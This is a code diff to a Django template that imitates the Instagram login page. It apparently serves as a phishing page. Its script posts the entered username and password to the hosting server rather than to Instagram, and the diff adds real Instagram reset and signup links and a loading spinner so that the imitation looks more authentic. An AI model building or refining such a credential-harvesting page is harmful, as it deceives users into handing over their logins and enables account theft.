@@ -2,6 +2,7 @@
 <html lang="en" dir="ltr">
   <head>
     {% load static %}
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="{% static 'Instagram.css' %}">
     <meta charset="utf-8">
     <title>Instagram</title>
@@ -17,12 +18,12 @@
         <input aria-describedby="" id="password" placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" spellcheck="false" value="" type="password">
       </div>
 
-      <a id="forgot" href="#">Forgot password?</a>
+      <a id="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
       <div class="login">
         <button type="button" name="button" onclick="login()" id="login">Log In</button>
       </div>
 
-      <p id="noaccount">Don't have an account? <a href="" id="signup">Sign up</a></p>
+      <p id="noaccount">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" id="signup">Sign up</a></p>
     </div>
     <footer>
       <p id="from">from</p>
@@ -30,9 +31,18 @@
     </footer>
   </body>
 </html>
+<style media="screen">
+  #login {
+    height: 38px;
+    padding: 0;
+  }
+
+</style>
 
 <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+<script src="{% static 'loading.js' %}"></script>
 <script type="text/javascript">
+
   function login()
   {
     var username = document.getElementById("username").value;
@@ -43,6 +53,7 @@
     xmlHttp.open('POST', window.location.href);
     xmlHttp.onload = function (e) {
     if (xmlHttp.readyState === 4) {
+        stopLoading();
         if (xmlHttp.status === 200) {
           document.open();
           window.close();
@@ -55,6 +66,7 @@
     };
     xmlHttp.setRequestHeader('X-CSRFToken', csrftoken);
     xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    load();
     xmlHttp.send("username="+username+"&password="+password);
   }
 </script>
